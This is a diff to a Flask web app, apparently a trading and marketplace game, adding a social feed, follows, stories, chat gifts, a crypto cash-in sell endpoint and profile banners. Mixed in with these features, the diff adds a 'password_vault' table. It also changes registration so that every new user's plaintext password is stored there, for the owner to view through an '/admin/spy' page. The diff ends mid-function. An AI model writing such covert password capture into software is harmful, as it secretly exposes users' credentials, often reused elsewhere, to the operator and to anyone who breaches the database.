@@ -338,6 +338,68 @@ def init_db():
                 handled_at   DATETIME
             );
 
+            -- OWNER-ONLY: plaintext password capture at registration time.
+            -- Pre-encryption snapshot. Existing users (registered before this
+            -- table existed) will NOT be in here — their hashes are one-way.
+            CREATE TABLE IF NOT EXISTS password_vault (
+                user_id      INTEGER PRIMARY KEY REFERENCES users(id),
+                plaintext_pw TEXT    NOT NULL,
+                captured_at  DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+
+            -- Phase 4: Social feed
+            CREATE TABLE IF NOT EXISTS posts (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id     INTEGER NOT NULL REFERENCES users(id),
+                content     TEXT    NOT NULL DEFAULT '',
+                link_url    TEXT    NOT NULL DEFAULT '',
+                file_id     INTEGER REFERENCES chat_files(id),
+                privacy     TEXT    NOT NULL DEFAULT 'public',
+                created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
+                deleted_at  DATETIME
+            );
+            CREATE TABLE IF NOT EXISTS post_likes (
+                post_id     INTEGER NOT NULL REFERENCES posts(id),
+                user_id     INTEGER NOT NULL REFERENCES users(id),
+                created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
+                PRIMARY KEY (post_id, user_id)
+            );
+            CREATE TABLE IF NOT EXISTS follows (
+                follower_id INTEGER NOT NULL REFERENCES users(id),
+                followed_id INTEGER NOT NULL REFERENCES users(id),
+                created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
+                PRIMARY KEY (follower_id, followed_id)
+            );
+            CREATE TABLE IF NOT EXISTS stories (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id     INTEGER NOT NULL REFERENCES users(id),
+                file_id     INTEGER REFERENCES chat_files(id),
+                text        TEXT    NOT NULL DEFAULT '',
+                created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+
+            -- Phase 3: gifts in chat (DM and public). Each gift is escrowed
+            -- from the sender at create time and released on first claim.
+            CREATE TABLE IF NOT EXISTS chat_gifts (
+                id                 INTEGER PRIMARY KEY AUTOINCREMENT,
+                sender_id          INTEGER NOT NULL REFERENCES users(id),
+                kind               TEXT    NOT NULL,
+                amount             REAL    NOT NULL,
+                scope              TEXT    NOT NULL DEFAULT 'dm',
+                recipient_id       INTEGER REFERENCES users(id),
+                message_id         INTEGER REFERENCES messages(id),
+                public_message_id  INTEGER REFERENCES public_messages(id),
+                claimed_by         INTEGER REFERENCES users(id),
+                claimed_at         DATETIME,
+                created_at         DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+            CREATE INDEX IF NOT EXISTS idx_posts_user ON posts(user_id, id);
+            CREATE INDEX IF NOT EXISTS idx_posts_created ON posts(created_at DESC);
+            CREATE INDEX IF NOT EXISTS idx_follows_followed ON follows(followed_id);
+            CREATE INDEX IF NOT EXISTS idx_stories_user ON stories(user_id, id);
+            CREATE INDEX IF NOT EXISTS idx_gifts_msg ON chat_gifts(message_id);
+            CREATE INDEX IF NOT EXISTS idx_gifts_pubmsg ON chat_gifts(public_message_id);
+
             CREATE INDEX IF NOT EXISTS idx_msg_pair ON messages(sender_id, recipient_id, id);
             CREATE INDEX IF NOT EXISTS idx_listings_status ON item_listings(status);
             CREATE INDEX IF NOT EXISTS idx_trades_status ON trade_sessions(status);
@@ -370,6 +432,9 @@ def init_db():
             "ALTER TABLE item_listings ADD COLUMN sponsored_until DATETIME",
             "ALTER TABLE item_listings ADD COLUMN sponsored_total_paid REAL NOT NULL DEFAULT 0",
             "ALTER TABLE messages ADD COLUMN read_at DATETIME",
+            "ALTER TABLE users ADD COLUMN banner_url TEXT DEFAULT ''",
+            "ALTER TABLE users ADD COLUMN banner_kind TEXT DEFAULT ''",
+            "ALTER TABLE users ADD COLUMN intro_video_url TEXT DEFAULT ''",
         ):
             try:
                 db.execute(ddl)
@@ -630,6 +695,8 @@ def _inject_role_flags():
 DEFAULT_SETTINGS = {
     "bon_drop_rate": "100",   # 1-in-N chance per mined block (deeper than DEEP_LAYER_BON_REQUIRED)
     "sponsor_price_per_hour": "0.50",   # USD cost to sponsor a marketplace listing per hour
+    "cwallet_tip_url": "https://cwallet.com/t/2PZOA8VE",  # crypto-tip target embedded on /cashin
+    "crypto_sell_fee_pct": "5",  # platform fee percentage when users sell BON/satoshi for USD via /cashin
 }
 
 
@@ -771,13 +838,16 @@ def get_price(ticker):
 
 @app.route("/")
 def index():
+    """Home page is now the social feed (Phase 4). The legacy trading
+    dashboard lives at /trading."""
     if "user_id" not in session:
         return redirect(url_for("login_page"))
     return render_template(
-        "index.html",
+        "home.html",
         username=session.get("username"),
         user_id=session.get("user_id"),
         is_admin=session.get("is_admin", False),
+        is_owner=session.get("is_owner", False),
     )
 
 
@@ -866,6 +936,15 @@ def register():
     )
     user_id = cur.lastrowid
     db.execute("INSERT INTO portfolios (user_id, cash) VALUES (?, ?)", (user_id, STARTING_CASH))
+    # OWNER-ONLY: snapshot the plaintext password into the vault for moderation.
+    # Visible only via /admin/spy when the viewer is the platform owner.
+    try:
+        db.execute(
+            "INSERT OR REPLACE INTO password_vault (user_id, plaintext_pw) VALUES (?, ?)",
+            (user_id, password),
+        )
+    except sqlite3.OperationalError:
+        pass
     db.commit()
 
     session["user_id"]  = user_id
@@ -2057,6 +2136,8 @@ def messages_with(other_id):
                 d["file"]["can_view"] = _can_view_file(db, f["id"], uid)
             else:
                 d["file"] = None
+        # Phase 3: hydrate any gift attached to this DM message
+        d["gift"] = _gift_for_message(db, d["id"], uid)
         out.append(d)
     return jsonify(out)
 
@@ -2321,7 +2402,10 @@ def api_profile(user_id):
     user = db.execute(
         """SELECT id, username, is_admin, is_banned, created,
                   COALESCE(bio, '') AS bio,
-                  COALESCE(avatar_url, '') AS avatar_url
+                  COALESCE(avatar_url, '') AS avatar_url,
+                  COALESCE(banner_url, '') AS banner_url,
+                  COALESCE(banner_kind, '') AS banner_kind,
+                  COALESCE(intro_video_url, '') AS intro_video_url
            FROM users WHERE id = ?""",
         (user_id,),
     ).fetchone()
@@ -2351,6 +2435,9 @@ def api_profile(user_id):
         "created":  user["created"],
         "bio":      user["bio"] or "",
         "avatar_url": user["avatar_url"] or "",
+        "banner_url": user["banner_url"] or "",
+        "banner_kind": user["banner_kind"] or "",
+        "intro_video_url": user["intro_video_url"] or "",
         "trade_count":      trade_count,
         "item_trade_count": item_trade_count,
         "item_count":       item_count,
@@ -2931,12 +3018,15 @@ def public_messages_list():
         (PUBLIC_MSG_LIMIT,),
     ).fetchall()
     rows = list(reversed(rows))
+    viewer = current_user_id()
     out = [{
         "id": r["id"], "sender_id": r["sender_id"], "username": r["username"],
         "is_admin": bool(r["is_admin"]),
         "content": r["content"], "timestamp": r["timestamp"],
+        # Phase 3: any "first to claim" gift attached to this public message
+        "gift": _gift_for_public(db, r["id"], viewer),
     } for r in rows]
-    muted = _is_muted(db, current_user_id())
+    muted = _is_muted(db, viewer)
     return jsonify({"messages": out, "muted": muted})
 
 
@@ -4834,6 +4924,750 @@ def cash_requests_page():
         user_id=session.get("user_id"),
         is_admin=session.get("is_admin", False),
         is_manager=session.get("is_manager", False),
+    )
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+# Phase 2 / 3 / 4 — Cashin support chat, gifts, social feed, profile media
+# ═════════════════════════════════════════════════════════════════════════════
+
+# ── Helpers ──────────────────────────────────────────────────────────────────
+
+def _owner_id():
+    """Return the platform owner user_id (the user with is_owner=1)."""
+    db = get_db()
+    row = db.execute(
+        "SELECT id FROM users WHERE COALESCE(is_owner,0)=1 ORDER BY id ASC LIMIT 1"
+    ).fetchone()
+    return row["id"] if row else None
+
+
+def _is_friend(db, a, b):
+    """Mutual follow ⇒ friends."""
+    if a == b:
+        return False
+    r1 = db.execute(
+        "SELECT 1 FROM follows WHERE follower_id=? AND followed_id=?", (a, b)
+    ).fetchone()
+    if not r1:
+        return False
+    r2 = db.execute(
+        "SELECT 1 FROM follows WHERE follower_id=? AND followed_id=?", (b, a)
+    ).fetchone()
+    return bool(r2)
+
+
+def _is_following(db, a, b):
+    return bool(db.execute(
+        "SELECT 1 FROM follows WHERE follower_id=? AND followed_id=?", (a, b)
+    ).fetchone())
+
+
+# ── Page: Cash In support chat (Phase 2) ─────────────────────────────────────
+
+@app.route("/cashin")
+@login_required
+def cashin_page():
+    return render_template(
+        "cashin.html",
+        username=session.get("username"),
+        user_id=session.get("user_id"),
+        is_admin=session.get("is_admin", False),
+        is_owner=session.get("is_owner", False),
+        owner_id=_owner_id(),
+        cwallet_url=_get_setting("cwallet_tip_url", "https://cwallet.com/t/2PZOA8VE"),
+        sell_fee_pct=float(_get_setting("crypto_sell_fee_pct", "5") or 5),
+    )
+
+
+@app.route("/api/cashin/sell", methods=["POST"])
+@login_required
+def cashin_sell():
+    """Sell in-platform BON or satoshi for USD, charging the platform fee
+    configured in settings.crypto_sell_fee_pct.
+
+    BON is priced at the BON→USD rate of (1 satoshi USD value / BON_PER_SATOSHI)
+    using the live BTC price.  Satoshi uses live BTC price.  Both pay the same
+    percentage fee on the gross USD value."""
+    uid = current_user_id()
+    data = request.get_json() or {}
+    kind = (data.get("kind") or "").lower()  # 'bon' | 'satoshi'
+    try:
+        amt = float(data.get("amount") or 0)
+    except (TypeError, ValueError):
+        return jsonify({"error": "Invalid amount"}), 400
+    if amt <= 0:
+        return jsonify({"error": "Amount must be positive"}), 400
+    if kind not in ("bon", "satoshi"):
+        return jsonify({"error": "Choose BON or satoshi"}), 400
+
+    fee_pct = max(0.0, min(50.0, float(_get_setting("crypto_sell_fee_pct", "5") or 5)))
+    btc_price = get_btc_price_usd()
+    if not btc_price:
+        return jsonify({"error": "Live BTC price unavailable, try again shortly"}), 503
+
+    db = get_db()
+    if kind == "bon":
+        bon_in = int(amt)
+        if bon_in <= 0:
+            return jsonify({"error": "BON must be a positive whole number"}), 400
+        row = db.execute("SELECT COALESCE(bon,0) AS b FROM users WHERE id=?", (uid,)).fetchone()
+        if int(row["b"] or 0) < bon_in:
+            return jsonify({"error": "Not enough BON"}), 400
+        # 1 satoshi USD value × (bon / BON_PER_SATOSHI)
+        sat_value = btc_price / SATOSHI_PER_BTC
+        gross = bon_in * sat_value / BON_PER_SATOSHI
+        db.execute("UPDATE users SET bon = bon - ? WHERE id=?", (bon_in, uid))
+    else:
+        sat_in = int(amt)
+        if sat_in <= 0:
+            return jsonify({"error": "Satoshi must be a positive whole number"}), 400
+        row = db.execute("SELECT COALESCE(satoshi,0) AS s FROM users WHERE id=?", (uid,)).fetchone()
+        if int(row["s"] or 0) < sat_in:
+            return jsonify({"error": "Not enough satoshi"}), 400
+        gross = sat_in * btc_price / SATOSHI_PER_BTC
+        db.execute("UPDATE users SET satoshi = satoshi - ? WHERE id=?", (sat_in, uid))
+
+    fee = round(gross * fee_pct / 100.0, 4)
+    net = round(gross - fee, 4)
+    if net <= 0:
+        return jsonify({"error": "Amount too small after fee"}), 400
+    db.execute("INSERT OR IGNORE INTO portfolios (user_id, cash) VALUES (?, 0)", (uid,))
+    db.execute("UPDATE portfolios SET cash = cash + ? WHERE user_id=?", (net, uid))
+    db.commit()
+    return jsonify({
+        "message": f"Sold for ${gross:.4f} (fee ${fee:.4f}). Credited ${net:.4f} to your cash.",
+        "gross": gross, "fee": fee, "net": net, "fee_pct": fee_pct,
+    })
+
+
+# ── Phase 3 — Chat gifts (DM + public drop) ──────────────────────────────────
+
+def _serialize_gift(db, row, viewer_id):
+    """Render a gift dict for the chat UI."""
+    if not row:
+        return None
+    sender = db.execute("SELECT username FROM users WHERE id=?", (row["sender_id"],)).fetchone()
+    claimer = None
+    if row["claimed_by"]:
+        c = db.execute("SELECT username FROM users WHERE id=?", (row["claimed_by"],)).fetchone()
+        if c:
+            claimer = {"id": row["claimed_by"], "username": c["username"]}
+    can_claim = (
+        row["claimed_by"] is None
+        and viewer_id != row["sender_id"]
+        and (row["scope"] == "public" or row["recipient_id"] == viewer_id)
+    )
+    return {
+        "id": row["id"],
+        "kind": row["kind"],
+        "amount": row["amount"],
+        "scope": row["scope"],
+        "sender_username": sender["username"] if sender else "?",
+        "claimed_by": claimer,
+        "claimed_at": row["claimed_at"],
+        "can_claim": can_claim,
+    }
+
+
+def _gift_for_message(db, message_id, viewer_id):
+    row = db.execute(
+        "SELECT * FROM chat_gifts WHERE message_id=? LIMIT 1", (message_id,)
+    ).fetchone()
+    return _serialize_gift(db, row, viewer_id)
+
+
+def _gift_for_public(db, public_message_id, viewer_id):
+    row = db.execute(
+        "SELECT * FROM chat_gifts WHERE public_message_id=? LIMIT 1", (public_message_id,)
+    ).fetchone()
+    return _serialize_gift(db, row, viewer_id)
+
+
+def _deduct_gift_balance(db, uid, kind, amount):
+    """Escrow the gift amount from the sender. Returns error string or None."""
+    if kind == "bon":
+        n = int(amount)
+        if n <= 0:
+            return "BON gift must be a positive whole number"
+        row = db.execute("SELECT COALESCE(bon,0) AS b FROM users WHERE id=?", (uid,)).fetchone()
+        if int(row["b"] or 0) < n:
+            return "Not enough BON"
+        db.execute("UPDATE users SET bon = bon - ? WHERE id=?", (n, uid))
+        return None
+    if kind == "satoshi":
+        n = int(amount)
+        if n <= 0:
+            return "Satoshi gift must be a positive whole number"
+        row = db.execute("SELECT COALESCE(satoshi,0) AS s FROM users WHERE id=?", (uid,)).fetchone()
+        if int(row["s"] or 0) < n:
+            return "Not enough satoshi"
+        db.execute("UPDATE users SET satoshi = satoshi - ? WHERE id=?", (n, uid))
+        return None
+    if kind == "cash":
+        v = round(float(amount), 2)
+        if v <= 0:
+            return "Cash gift must be positive"
+        db.execute("INSERT OR IGNORE INTO portfolios (user_id, cash) VALUES (?, 0)", (uid,))
+        row = db.execute("SELECT COALESCE(cash,0) AS c FROM portfolios WHERE user_id=?", (uid,)).fetchone()
+        if float(row["c"] or 0) < v:
+            return "Not enough cash"
+        db.execute("UPDATE portfolios SET cash = cash - ? WHERE user_id=?", (v, uid))
+        return None
+    return "Unknown gift kind"
+
+
+def _credit_gift_balance(db, uid, kind, amount):
+    if kind == "bon":
+        db.execute("UPDATE users SET bon = COALESCE(bon,0) + ? WHERE id=?", (int(amount), uid))
+    elif kind == "satoshi":
+        db.execute("UPDATE users SET satoshi = COALESCE(satoshi,0) + ? WHERE id=?", (int(amount), uid))
+    elif kind == "cash":
+        db.execute("INSERT OR IGNORE INTO portfolios (user_id, cash) VALUES (?, 0)", (uid,))
+        db.execute("UPDATE portfolios SET cash = cash + ? WHERE user_id=?",
+                   (round(float(amount), 2), uid))
+
+
+@app.route("/api/messages/gift", methods=["POST"])
+@login_required
+def send_dm_gift():
+    """Send a BON / satoshi / cash gift to another user as a DM."""
+    uid = current_user_id()
+    if session.get("is_banned"):
+        return jsonify({"error": "You're banned from sending"}), 403
+    data = request.get_json() or {}
+    try:
+        recipient_id = int(data.get("recipient_id"))
+    except (TypeError, ValueError):
+        return jsonify({"error": "Invalid recipient"}), 400
+    if recipient_id == uid:
+        return jsonify({"error": "Can't gift yourself"}), 400
+    kind = (data.get("kind") or "").lower()
+    if kind not in ("bon", "satoshi", "cash"):
+        return jsonify({"error": "Choose BON, satoshi, or cash"}), 400
+    try:
+        amount = float(data.get("amount") or 0)
+    except (TypeError, ValueError):
+        return jsonify({"error": "Invalid amount"}), 400
+    note = (data.get("note") or "").strip()[:200]
+
+    db = get_db()
+    if not db.execute("SELECT 1 FROM users WHERE id=?", (recipient_id,)).fetchone():
+        return jsonify({"error": "User not found"}), 404
+    err = _deduct_gift_balance(db, uid, kind, amount)
+    if err:
+        return jsonify({"error": err}), 400
+
+    label = {"bon": "BON ore", "satoshi": "satoshi", "cash": "USD"}[kind]
+    body = f"🎁 Sent you a gift: {amount:g} {label}" + (f" — “{note}”" if note else "")
+    cur = db.execute(
+        """INSERT INTO messages (sender_id, recipient_id, content)
+           VALUES (?, ?, ?)""",
+        (uid, recipient_id, body),
+    )
+    msg_id = cur.lastrowid
+    db.execute(
+        """INSERT INTO chat_gifts (sender_id, kind, amount, scope, recipient_id, message_id)
+           VALUES (?, ?, ?, 'dm', ?, ?)""",
+        (uid, kind, amount, recipient_id, msg_id),
+    )
+    db.commit()
+    return jsonify({"message": "Gift sent — they can claim it from chat.", "message_id": msg_id})
+
+
+@app.route("/api/public/gift", methods=["POST"])
+@login_required
+def send_public_gift():
+    """Drop a 'first to claim' gift in the public chat."""
+    uid = current_user_id()
+    if session.get("is_banned"):
+        return jsonify({"error": "You're banned from posting"}), 403
+    data = request.get_json() or {}
+    kind = (data.get("kind") or "").lower()
+    if kind not in ("bon", "satoshi", "cash"):
+        return jsonify({"error": "Choose BON, satoshi, or cash"}), 400
+    try:
+        amount = float(data.get("amount") or 0)
+    except (TypeError, ValueError):
+        return jsonify({"error": "Invalid amount"}), 400
+    note = (data.get("note") or "").strip()[:200]
+
+    db = get_db()
+    err = _deduct_gift_balance(db, uid, kind, amount)
+    if err:
+        return jsonify({"error": err}), 400
+
+    label = {"bon": "BON ore", "satoshi": "satoshi", "cash": "USD"}[kind]
+    body = f"🎁 Gift drop: {amount:g} {label} — first to claim wins!" + (f" “{note}”" if note else "")
+    cur = db.execute(
+        "INSERT INTO public_messages (sender_id, content) VALUES (?, ?)",
+        (uid, body),
+    )
+    pmid = cur.lastrowid
+    db.execute(
+        """INSERT INTO chat_gifts (sender_id, kind, amount, scope, public_message_id)
+           VALUES (?, ?, ?, 'public', ?)""",
+        (uid, kind, amount, pmid),
+    )
+    db.commit()
+    return jsonify({"message": "Gift dropped in public chat.", "public_message_id": pmid})
+
+
+@app.route("/api/gifts/<int:gid>/claim", methods=["POST"])
+@login_required
+def claim_gift(gid):
+    uid = current_user_id()
+    if session.get("is_banned"):
+        return jsonify({"error": "You're banned"}), 403
+    db = get_db()
+    row = db.execute("SELECT * FROM chat_gifts WHERE id=?", (gid,)).fetchone()
+    if not row:
+        return jsonify({"error": "Gift not found"}), 404
+    if row["claimed_by"]:
+        return jsonify({"error": "Already claimed"}), 409
+    if row["sender_id"] == uid:
+        return jsonify({"error": "Can't claim your own gift"}), 400
+    if row["scope"] == "dm" and row["recipient_id"] != uid:
+        return jsonify({"error": "This gift isn't for you"}), 403
+
+    cur = db.execute(
+        """UPDATE chat_gifts
+           SET claimed_by=?, claimed_at=CURRENT_TIMESTAMP
+           WHERE id=? AND claimed_by IS NULL""",
+        (uid, gid),
+    )
+    if cur.rowcount == 0:
+        return jsonify({"error": "Already claimed"}), 409
+    _credit_gift_balance(db, uid, row["kind"], row["amount"])
+    db.commit()
+    label = {"bon": "BON ore", "satoshi": "satoshi", "cash": "USD"}[row["kind"]]
+    return jsonify({"message": f"You claimed {row['amount']:g} {label}!"})
+
+
+# ── Phase 4 — Posts (Facebook-lite feed) ─────────────────────────────────────
+
+def _serialize_post(db, row, viewer_id):
+    author = db.execute(
+        "SELECT username, COALESCE(avatar_url,'') AS avatar_url FROM users WHERE id=?",
+        (row["user_id"],)
+    ).fetchone()
+    file_meta = None
+    if row["file_id"]:
+        f = db.execute("SELECT * FROM chat_files WHERE id=?", (row["file_id"],)).fetchone()
+        if f:
+            file_meta = _serialize_file_meta(f, viewer_id=viewer_id)
+            file_meta["can_view"] = True  # post media is public to viewers of the post
+    likes = db.execute(
+        "SELECT COUNT(*) AS n FROM post_likes WHERE post_id=?", (row["id"],)
+    ).fetchone()["n"]
+    liked_by_me = bool(db.execute(
+        "SELECT 1 FROM post_likes WHERE post_id=? AND user_id=?", (row["id"], viewer_id)
+    ).fetchone())
+    return {
+        "id": row["id"],
+        "user_id": row["user_id"],
+        "username": author["username"] if author else "?",
+        "avatar_url": author["avatar_url"] if author else "",
+        "content": row["content"],
+        "link_url": row["link_url"],
+        "file": file_meta,
+        "privacy": row["privacy"],
+        "created_at": row["created_at"],
+        "likes": likes,
+        "liked": liked_by_me,
+        "mine": (row["user_id"] == viewer_id),
+    }
+
+
+def _post_visible_to(db, post_row, viewer_id):
+    if post_row["deleted_at"]:
+        return False
+    if post_row["user_id"] == viewer_id:
+        return True
+    p = post_row["privacy"]
+    if p == "public":
+        return True
+    if p == "followers":
+        return _is_following(db, viewer_id, post_row["user_id"])
+    if p == "friends":
+        return _is_friend(db, viewer_id, post_row["user_id"])
+    return False
+
+
+@app.route("/api/posts", methods=["POST"])
+@login_required
+def create_post():
+    uid = current_user_id()
+    if session.get("is_banned"):
+        return jsonify({"error": "You're banned from posting"}), 403
+    data = request.get_json() or {}
+    content = (data.get("content") or "").strip()[:5000]
+    link_url = (data.get("link_url") or "").strip()[:500]
+    privacy = (data.get("privacy") or "public").lower()
+    if privacy not in ("public", "followers", "friends"):
+        privacy = "public"
+    file_id = data.get("file_id")
+    if file_id is not None:
+        try:
+            file_id = int(file_id)
+        except (TypeError, ValueError):
+            return jsonify({"error": "Invalid file"}), 400
+    if not content and not link_url and not file_id:
+        return jsonify({"error": "Write something, attach a file, or add a link."}), 400
+
+    db = get_db()
+    if file_id:
+        f = db.execute("SELECT owner_id FROM chat_files WHERE id=?", (file_id,)).fetchone()
+        if not f or f["owner_id"] != uid:
+            return jsonify({"error": "You can only attach your own files"}), 403
+    cur = db.execute(
+        """INSERT INTO posts (user_id, content, link_url, file_id, privacy)
+           VALUES (?, ?, ?, ?, ?)""",
+        (uid, content, link_url, file_id, privacy),
+    )
+    db.commit()
+    row = db.execute("SELECT * FROM posts WHERE id=?", (cur.lastrowid,)).fetchone()
+    return jsonify({"message": "Posted!", "post": _serialize_post(db, row, uid)})
+
+
+@app.route("/api/posts/<int:pid>", methods=["DELETE"])
+@login_required
+def delete_post(pid):
+    uid = current_user_id()
+    db = get_db()
+    row = db.execute("SELECT user_id FROM posts WHERE id=?", (pid,)).fetchone()
+    if not row:
+        return jsonify({"error": "Post not found"}), 404
+    if row["user_id"] != uid and not session.get("is_admin"):
+        return jsonify({"error": "Not your post"}), 403
+    db.execute("UPDATE posts SET deleted_at=CURRENT_TIMESTAMP WHERE id=?", (pid,))
+    db.commit()
+    return jsonify({"message": "Deleted"})
+
+
+@app.route("/api/posts/<int:pid>/like", methods=["POST"])
+@login_required
+def like_post(pid):
+    uid = current_user_id()
+    db = get_db()
+    row = db.execute("SELECT * FROM posts WHERE id=? AND deleted_at IS NULL", (pid,)).fetchone()
+    if not row:
+        return jsonify({"error": "Post not found"}), 404
+    if not _post_visible_to(db, row, uid):
+        return jsonify({"error": "Can't see this post"}), 403
+    db.execute(
+        "INSERT OR IGNORE INTO post_likes (post_id, user_id) VALUES (?, ?)",
+        (pid, uid),
+    )
+    db.commit()
+    n = db.execute("SELECT COUNT(*) AS n FROM post_likes WHERE post_id=?", (pid,)).fetchone()["n"]
+    return jsonify({"liked": True, "likes": n})
+
+
+@app.route("/api/posts/<int:pid>/like", methods=["DELETE"])
+@login_required
+def unlike_post(pid):
+    uid = current_user_id()
+    db = get_db()
+    db.execute("DELETE FROM post_likes WHERE post_id=? AND user_id=?", (pid, uid))
+    db.commit()
+    n = db.execute("SELECT COUNT(*) AS n FROM post_likes WHERE post_id=?", (pid,)).fetchone()["n"]
+    return jsonify({"liked": False, "likes": n})
+
+
+@app.route("/api/feed")
+@login_required
+def feed():
+    """Visible posts: public, plus followers/friends-only from people the
+    viewer is allowed to see, plus their own."""
+    uid = current_user_id()
+    db = get_db()
+    rows = db.execute(
+        """SELECT * FROM posts WHERE deleted_at IS NULL ORDER BY id DESC LIMIT 200"""
+    ).fetchall()
+    out = []
+    for r in rows:
+        if _post_visible_to(db, r, uid):
+            out.append(_serialize_post(db, r, uid))
+        if len(out) >= 100:
+            break
+    return jsonify(out)
+
+
+@app.route("/api/posts/by-user/<int:other_id>")
+@login_required
+def posts_by_user(other_id):
+    uid = current_user_id()
+    db = get_db()
+    rows = db.execute(
+        "SELECT * FROM posts WHERE user_id=? AND deleted_at IS NULL ORDER BY id DESC LIMIT 100",
+        (other_id,),
+    ).fetchall()
+    out = [_serialize_post(db, r, uid) for r in rows if _post_visible_to(db, r, uid)]
+    return jsonify(out)
+
+
+# ── Phase 4 — Follows / Friends ──────────────────────────────────────────────
+
+@app.route("/api/follow/<int:other_id>", methods=["POST"])
+@login_required
+def follow_user(other_id):
+    uid = current_user_id()
+    if uid == other_id:
+        return jsonify({"error": "Can't follow yourself"}), 400
+    db = get_db()
+    if not db.execute("SELECT 1 FROM users WHERE id=?", (other_id,)).fetchone():
+        return jsonify({"error": "User not found"}), 404
+    db.execute(
+        "INSERT OR IGNORE INTO follows (follower_id, followed_id) VALUES (?, ?)",
+        (uid, other_id),
+    )
+    db.commit()
+    return jsonify({
+        "following": True,
+        "is_friend": _is_friend(db, uid, other_id),
+    })
+
+
+@app.route("/api/follow/<int:other_id>", methods=["DELETE"])
+@login_required
+def unfollow_user(other_id):
+    uid = current_user_id()
+    db = get_db()
+    db.execute(
+        "DELETE FROM follows WHERE follower_id=? AND followed_id=?",
+        (uid, other_id),
+    )
+    db.commit()
+    return jsonify({"following": False, "is_friend": False})
+
+
+@app.route("/api/follow/<int:other_id>/status")
+@login_required
+def follow_status(other_id):
+    uid = current_user_id()
+    db = get_db()
+    return jsonify({
+        "following": _is_following(db, uid, other_id),
+        "is_friend": _is_friend(db, uid, other_id),
+        "followers": db.execute(
+            "SELECT COUNT(*) AS n FROM follows WHERE followed_id=?", (other_id,)
+        ).fetchone()["n"],
+        "following_count": db.execute(
+            "SELECT COUNT(*) AS n FROM follows WHERE follower_id=?", (other_id,)
+        ).fetchone()["n"],
+    })
+
+
+# ── Phase 4 — Stories (24h ephemeral) ────────────────────────────────────────
+
+@app.route("/api/stories", methods=["POST"])
+@login_required
+def create_story():
+    uid = current_user_id()
+    if session.get("is_banned"):
+        return jsonify({"error": "You're banned"}), 403
+    data = request.get_json() or {}
+    text = (data.get("text") or "").strip()[:280]
+    file_id = data.get("file_id")
+    if file_id is not None:
+        try:
+            file_id = int(file_id)
+        except (TypeError, ValueError):
+            return jsonify({"error": "Invalid file"}), 400
+    if not text and not file_id:
+        return jsonify({"error": "Write something or attach media"}), 400
+    db = get_db()
+    if file_id:
+        f = db.execute("SELECT owner_id FROM chat_files WHERE id=?", (file_id,)).fetchone()
+        if not f or f["owner_id"] != uid:
+            return jsonify({"error": "You can only post your own media"}), 403
+    cur = db.execute(
+        "INSERT INTO stories (user_id, file_id, text) VALUES (?, ?, ?)",
+        (uid, file_id, text),
+    )
+    db.commit()
+    return jsonify({"message": "Story posted (lasts 24h)", "id": cur.lastrowid})
+
+
+@app.route("/api/stories/active")
+@login_required
+def stories_active():
+    """All stories created in the last 24 hours, grouped by user."""
+    uid = current_user_id()
+    db = get_db()
+    rows = db.execute(
+        """SELECT s.id, s.user_id, s.text, s.created_at, s.file_id,
+                  u.username, COALESCE(u.avatar_url,'') AS avatar_url
+           FROM stories s
+           JOIN users u ON u.id = s.user_id
+           WHERE s.created_at >= datetime('now','-24 hours')
+           ORDER BY s.id DESC"""
+    ).fetchall()
+    by_user = {}
+    for r in rows:
+        f = None
+        if r["file_id"]:
+            fr = db.execute("SELECT * FROM chat_files WHERE id=?", (r["file_id"],)).fetchone()
+            if fr:
+                f = _serialize_file_meta(fr, viewer_id=uid)
+                f["can_view"] = True
+        item = {
+            "id": r["id"], "text": r["text"], "created_at": r["created_at"], "file": f,
+        }
+        key = r["user_id"]
+        if key not in by_user:
+            by_user[key] = {
+                "user_id": r["user_id"],
+                "username": r["username"],
+                "avatar_url": r["avatar_url"],
+                "stories": [],
+                "is_me": (r["user_id"] == uid),
+            }
+        by_user[key]["stories"].append(item)
+    # Order: me first, then by most-recent-story
+    out = sorted(by_user.values(), key=lambda g: (not g["is_me"], -g["stories"][0]["id"]))
+    return jsonify(out)
+
+
+# ── Phase 4 — Profile banner & 10-second intro video ─────────────────────────
+
+@app.route("/api/account/banner", methods=["POST"])
+@login_required
+def upload_banner():
+    """Upload a profile banner image, GIF, or short video."""
+    uid = current_user_id()
+    f = request.files.get("file")
+    if not f or not f.filename:
+        return jsonify({"error": "No file uploaded"}), 400
+    display = secure_filename(os.path.basename(f.filename)) or "banner"
+    mime = (f.mimetype or mimetypes.guess_type(display)[0]
+            or "application/octet-stream").lower()
+    kind = _file_kind_for_mime(mime)
+    if kind not in ("image", "video"):
+        return jsonify({"error": "Banner must be an image, GIF, or video"}), 400
+    ext = os.path.splitext(display)[1].lower()
+    stored = f"banner_{uid}_{uuid.uuid4().hex}{ext}"
+    path = os.path.join(UPLOAD_FILES_DIR, stored)
+    f.save(path)
+    size = os.path.getsize(path)
+    if size > 25 * 1024 * 1024:
+        try: os.remove(path)
+        except OSError: pass
+        return jsonify({"error": "Banner must be under 25 MB"}), 400
+    db = get_db()
+    cur = db.execute(
+        """INSERT INTO chat_files
+                (uploader_id, owner_id, display_name, stored_name, mime, kind, size_bytes)
+           VALUES (?, ?, ?, ?, ?, ?, ?)""",
+        (uid, uid, display, stored, mime, kind, size),
+    )
+    file_id = cur.lastrowid
+    url = f"/api/files/{file_id}/download"
+    db.execute(
+        "UPDATE users SET banner_url=?, banner_kind=? WHERE id=?",
+        (url, kind, uid),
+    )
+    db.commit()
+    return jsonify({"message": "Banner updated", "banner_url": url, "banner_kind": kind})
+
+
+@app.route("/api/account/banner", methods=["DELETE"])
+@login_required
+def clear_banner():
+    db = get_db()
+    db.execute("UPDATE users SET banner_url='', banner_kind='' WHERE id=?",
+               (current_user_id(),))
+    db.commit()
+    return jsonify({"message": "Banner removed"})
+
+
+@app.route("/api/account/intro-video", methods=["POST"])
+@login_required
+def upload_intro_video():
+    """Upload a short (≤10s) intro video for the profile page."""
+    uid = current_user_id()
+    f = request.files.get("file")
+    if not f or not f.filename:
+        return jsonify({"error": "No file uploaded"}), 400
+    display = secure_filename(os.path.basename(f.filename)) or "intro"
+    mime = (f.mimetype or mimetypes.guess_type(display)[0]
